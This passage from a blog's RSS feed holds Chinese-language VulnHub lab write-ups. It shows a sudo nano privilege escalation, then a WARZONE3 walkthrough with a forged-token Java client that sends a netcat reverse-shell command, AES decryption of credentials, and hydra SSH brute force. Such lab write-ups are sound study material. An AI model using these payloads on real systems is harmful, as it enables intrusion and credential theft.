ord(&amp;#x27;A&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		for x in range(0, 26):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			result = (65 + x*89 - b) % 26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			if result == 0:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				text.append(chr(x + ord(&amp;#x27;A&amp;#x27;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	print(&amp;#x27;&amp;#x27;.join(text))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	affine_encrypted_text = &amp;quot;FAJSRWOXLAXDQZAWNDDVLSU&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	affine_decrypt(affine_encrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1428.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到的密码测试之后是属于 carlos 用户的密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1429.png&#34; width=&#34;240&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;sudonano提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudonano提权&#34;&gt;#&lt;/a&gt; sudo (nano) 提权&lt;/h3&gt;
&lt;p&gt;有了密码之后可以看到 carlos 用户权限设置&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1430.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;nano 的权限设置错误了&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看gtfobins找到了提权命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo /bin/nano /opt/priv&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ctrl + R&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ctrl + X&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reset; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1431.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/147%20WARZONE3/</guid>
            <title>VULNHUB 47 WARZONE3</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/147%20WARZONE3/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2Fyem9uZS0zLWV4b2dlbiw2MDYv&#34;&gt;https://www.vulnhub.com/entry/warzone-3-exogen,606/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 WARZONE3：桥接于 192.168.0.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | uniq&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;开靶机前后各扫描一次，得到靶机 ip 192.168.0.186&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1432.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;2 ）扫描靶机上开放的端口及详细信息&lt;br&gt;
 &lt;code&gt;sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.187 --min-rate=5000&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1433.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;nmap 参数说明&lt;br&gt;
 - sV 表示扫描服务及版本信息&lt;br&gt;
 - sC 表示以默认的脚本进行扫描&lt;br&gt;
 - T4 表示控制扫描的速度&lt;br&gt;
 - Pn 表示不用 ping 去扫描机器&lt;br&gt;
–open 表示只扫描开放的端口&lt;br&gt;
 - p- 表示扫描所有的端口&lt;br&gt;
–min-rate 设置最小的扫描速度&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;检索到的有效服务如下所示：&lt;br&gt;
21 ftp：可尝试进行匿名登陆下载文件&lt;br&gt;
 22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
 4444 krb 524 ：未知端口&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;ftp-匿名访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-匿名访问&#34;&gt;#&lt;/a&gt; FTP 匿名访问&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;ZnRwOi8vMTkyLjE2OC4wLjE4Ni8=&#34;&gt;ftp://192.168.0.186/&lt;/span&gt; 进行 ftp 信息收集&lt;br&gt;
有一个文件夹 pub、里边有一个 jar 文件和一个 txt 文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1434.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 ftp 服务器里的这两个文件都下载到本地，可以在 ftp 命令行中使用 lcd 来控制本地的目录&lt;/p&gt;
&lt;p&gt;note.txt 中提示 token 是 username 的 SHA 256 值，并且有一个邮箱是 alienum@exogenesis，即用户为 alienum&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1435.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;java代码审计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java代码审计&#34;&gt;#&lt;/a&gt; java 代码审计&lt;/h3&gt;
&lt;p&gt;将下载后的 jar 文件，用 jd-gui 打开后查看源代码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1436.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;RE 有四个量，分别是 token，option，cmd，value，以及一些继承序列化和转变为字符串、get set 方法等&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1437.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Token 由 value 和 role 组成&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1438.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 Starter 即主函数中找到了一个判断角色，当角色为 astronaut 时允许进入&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1439.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;先将这个 jar 文件执行一下，弹出来一个登陆框，随意输入信息之后报错，识别不到 url 地址为 warzone.local&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1440.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;改变本地 hosts 文件，修改其 DNS 解析地址为靶机 ip&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1441.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并同时将已知用户 alienum 的 SHA 256 值计算出来，此 SHA 256 值根据提示内容来说就应该是 alienum 用户的 TOKEN 值&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1442.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;也可以根据 terminal 的命令来计算，在 kali 下输入如下命令即可计算 SHA 256&lt;br&gt;
 &lt;code&gt;echo -n &amp;quot;alienum&amp;quot; | shasum -a 256&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1443.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec&lt;/p&gt;
&lt;p&gt;再次用 alienum 用户和他的 token 登陆发现爆了错误&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1444.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在看到 java 源代码的时候，知道它执行了以个 CMd 的命令，现在我们已经可以绕过登陆并且又了 token 的值，可以写一个 java 文件执行任意命令，拿出 IDEA 其他的两个文件不变，主函数改为下面的代码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1445.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;package alien;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.io.IOException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.io.ObjectInputStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.io.ObjectOutputStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.net.Socket;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class Starter &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static Socket socket = null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static ObjectOutputStream os;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static Token token;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public static void main(String[] args) throws IOException, ClassNotFoundException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		socket = new Socket(&amp;quot;warzone.local&amp;quot;, 4444);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		os = new ObjectOutputStream(socket.getOutputStream());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		token = new&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		Token(&amp;quot;6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec&amp;quot;, &amp;quot;astronaut&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		RE list = new RE();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		list.setToken(token);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		list.setOption(&amp;quot;VIEW&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		list.setValue(&amp;quot;VALUE&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		list.setCmd(&amp;quot;nc 192.168.0.168 4444 -e /bin/bash&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		os.writeObject(list);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		ObjectInputStream is = new ObjectInputStream(socket.getInputStream());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		RE response = (RE) is.readObject();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		os.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		socket.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		System.out.println(response.getValue());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行之后 shell 成功反弹，拿到了 exomorph 的权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1446.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;java脚本解密aes&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java脚本解密aes&#34;&gt;#&lt;/a&gt; java 脚本解密 AES&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;标准化&lt;span class=&#34;built_in&#34;&gt;tty&lt;/span&gt;就不多说了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;script -qc /bin/bash /dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm;reset;stty rows 64 columns 118&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此用户下有两个文件，cat 发现乱码，file 检查文件属性，strings 查看内容&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1447.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到了一个密码，和一个 jar 文件，将 jar 文件拉到本地导入到 jd-gui&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1448.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;CrypoException 是一个普通的类&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1449.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Cryptor 是一个 AES 加密文件，加密过程中会调用这个里边的方法&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1450.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Main 函数定义要加密的 key，以及加密后的文件的路径&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1451.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;现在就用来写一个解密文件，用来将我们得到的密码 $:2Czq$(解密&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;先定义解密函数，通过如下方法来调用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public static void decrypt(String key, File inputFile, File outputFile) throws CryptoException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	doCrypto(Cipher.DECRYPT_MODE, key, inputFile, outputFile);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1452.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再来修改主函数，密钥维持不变，修改当前的解密文件内容和解密后的文件保存路径，并且调用解密方法，最后将我们解密后的内容查看&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;package alienum;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.io.File;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.io.IOException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class Main &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static String inputPath = &amp;quot;/Users/chentuo/JavaProjects/alienum/aliens.encrypted&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static String outputPath = &amp;quot;/Users/chentuo/JavaProjects/alienum/aliens.txt&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public Main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public static void main(String[] args) throws IOException, ClassNotFoundException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		String key = &amp;quot;w4rz0nerex0gener&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		File inputFile = new File(inputPath);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		File decryptedFile = new File(outputPath);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			alienum.Cryptor.decrypt(key, inputFile, decryptedFile);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125; catch (CryptoException var5) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			System.out.println(var5.getMessage());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			var5.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1453.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;运行此文件之后，即可以在自己设置的目录下找到我们的解密文件，但是这个解密之后的 txt 文件不能用 cat 来查看会显示乱码，用 file 命令确定是一个 data 类型后，用 strings 查看得到了解密后的文件内容&lt;br&gt;
 minotaur:m1nom1no…&lt;br&gt;
scylla:scyscy…&lt;br&gt;
echidna:ech1ech1…&lt;br&gt;
cyclops:cyccyc…&lt;br&gt;
anunnaki:nak1nak1…&lt;br&gt;
anunnaki:nak1nak2…&lt;br&gt;
anunnaki:nakinaki…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1454.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;sshpass-连接靶机&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sshpass-连接靶机&#34;&gt;#&lt;/a&gt; sshpass 连接靶机&lt;/h3&gt;
&lt;p&gt;得到了一串用户名和密码的组合，可能是 ssh 的用户和密码&lt;br&gt;
 &lt;code&gt;cat aliens.txt | cut -d &#39;:&#39; -f 1 &amp;gt; user.txt&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;cat aliens.txt | cut -d &#39;:&#39; -f 2 &amp;gt; pass.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1455.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;检查一下用户名和密码文件是否正确&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1456.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1457.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;hydra -L user.txt -P pass.txt ssh://192.168.31.53 -f -t 32 -I -vV&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1458.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1459.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 ssh 成功连接到了靶机中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1460.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;第一次登陆成功之后，第二次就可以用 sshpass 在命令行输入密码直接连接&lt;br&gt;
 &lt;code&gt;sshpass -p nak1nak1.. ssh anunnaki@192.168.0.186&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1461.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
